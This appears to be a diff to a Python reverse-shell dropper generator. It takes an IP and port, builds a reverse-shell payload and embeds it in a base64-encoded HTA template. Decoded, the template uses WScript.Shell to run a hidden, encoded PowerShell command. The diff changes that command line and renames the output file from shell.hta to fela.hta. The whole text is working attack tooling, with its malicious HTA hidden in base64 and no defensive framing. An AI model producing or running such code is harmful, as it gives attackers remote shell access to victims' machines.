@@ -18,13 +18,13 @@ def Main():
         return payload
     
     def hta(payload):
-        hta_b64 = "PGh0bWw+CjxoZWFkPgoKPEhUQTpBUFBMSUNBVElPTiBpZD0id2VpcmRodGEiCmFwcGxpY2F0aW9uTmFtZT0id2VpcmRodGEiCmJvcmRlcj0idGhpbiIKYm9yZGVyU3R5bGU9Im5vcm1hbCIKY2FwdGlvbj0ieWVzIgppY29uPSJodHRwOi8vMTI3LjAuMC4xL2Zhdmljb24uaWNvIgptYXhpbWl6ZUJ1dHRvbj0ieWVzIgptaW5pbWl6ZUJ1dHRvbj0ieWVzIgpzaG93SW5UYXNrYmFyPSJubyIKd2luZG93U3RhdGU9Im5vcm1hbCIKaW5uZXJCb3JkZXI9InllcyIKbmF2aWdhYmxlPSJ5ZXMiCnNjcm9sbD0iYXV0byIKc2Nyb2xsRmxhdD0ieWVzIgpzaW5nbGVJbnN0YW5jZT0ieWVzIiAKc3lzTWVudT0ieWVzIgpjb250ZXh0TWVudT0ieWVzIgpzZWxlY3Rpb249InllcyIgCnZlcnNpb249IjEuMCIgLz4KCjxzY3JpcHQ+CmE9bmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsKYS5ydW4oInBvd2Vyc2hlbGwuZXhlIC1ub3AgLXcgMSAtZW5jIEJBU0U2NCIsIDApO3dpbmRvdy5jbG9zZSgpOwo8L3NjcmlwdD4KPHRpdGxlPldlaXJkIFRpdGxlPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KPGgxPldFSVJEIEhUQTwvaDE+Cjxocj4KPC9ib2R5Pgo8L2h0bWw+Cgo="
+        hta_b64 = "PGh0bWw+CjxoZWFkPgoKPEhUQTpBUFBMSUNBVElPTiBpZD0id2VpcmRodGEiCmFwcGxpY2F0aW9uTmFtZT0id2VpcmRodGEiCmJvcmRlcj0idGhpbiIKYm9yZGVyU3R5bGU9Im5vcm1hbCIKY2FwdGlvbj0ieWVzIgppY29uPSJodHRwOi8vMTI3LjAuMC4xL2Zhdmljb24uaWNvIgptYXhpbWl6ZUJ1dHRvbj0ieWVzIgptaW5pbWl6ZUJ1dHRvbj0ieWVzIgpzaG93SW5UYXNrYmFyPSJubyIKd2luZG93U3RhdGU9Im5vcm1hbCIKaW5uZXJCb3JkZXI9InllcyIKbmF2aWdhYmxlPSJ5ZXMiCnNjcm9sbD0iYXV0byIKc2Nyb2xsRmxhdD0ieWVzIgpzaW5nbGVJbnN0YW5jZT0ieWVzIiAKc3lzTWVudT0ieWVzIgpjb250ZXh0TWVudT0ieWVzIgpzZWxlY3Rpb249InllcyIgCnZlcnNpb249IjEuMCIgLz4KCjxzY3JpcHQ+CmE9bmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsKYS5ydW4oInBvd2Vyc2hlbGwgLW5vcCAtdyAxIC1lbmMgQkFTRTY0IiwgMCk7d2luZG93LmNsb3NlKCk7Cjwvc2NyaXB0Pgo8dGl0bGU+V2VpcmQgVGl0bGU8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5Pgo8aDE+V0VJUkQgSFRBPC9oMT4KPGhyPgo8L2JvZHk+CjwvaHRtbD4KCg=="
         hta_plain = base64.b64decode(hta_b64).decode()
         hta = hta_plain.replace("BASE64" ,payload)
-        with open("shell.hta",'w',encoding = 'utf-8') as f:
+        with open("fela.hta",'w',encoding = 'utf-8') as f:
             f.write(hta)
             f.close()
-        print("[*] Written shell.hta")
+        print("[*] Written fela.hta")
 
     payload = reverse_shell(sys.argv[1], sys.argv[2])
     hta(payload)
